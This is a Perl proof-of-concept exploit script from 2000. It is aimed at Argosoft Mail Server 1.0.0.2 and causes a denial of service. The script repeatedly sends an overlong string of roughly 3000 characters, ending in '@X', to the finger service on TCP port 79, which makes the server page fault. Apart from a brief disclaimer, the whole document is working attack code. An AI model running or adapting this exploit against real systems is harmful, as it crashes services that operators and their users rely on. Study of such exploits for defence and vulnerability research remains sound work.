#!/usr/bin/perl
#
# Argosoft Mail Server 1.0.0.2 DoS
# Chopsui-cide[MmM] 2000
#
# ----------------------------------------------------------
# Disclaimer: this file is intended as proof of concept, and
# is not intended to be used for illegal purposes. I accept
# no responsibility for damage incurred by the use of it.
# ----------------------------------------------------------
#
# This will cause Argosoft Mail Server 1.0.0.2 to page fault if the finger
# daemon is running.
#

use IO::Socket;

$host = "tr" ;
$port = "79";

$count = 0;
$sod = "";
$len = 3000;
while($count < $len) {
        $sod .= "X";
        $count += 1;
}
$sod .= "\@X";
$count = 0;
while($count < 5) {
print "Connecting to $host:$port...";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>$port) || die "unable to connect.\n";
print "done.\n";
print $socket "$sod\x0a";
sleep(5);
close($socket);
$count += 1;
}

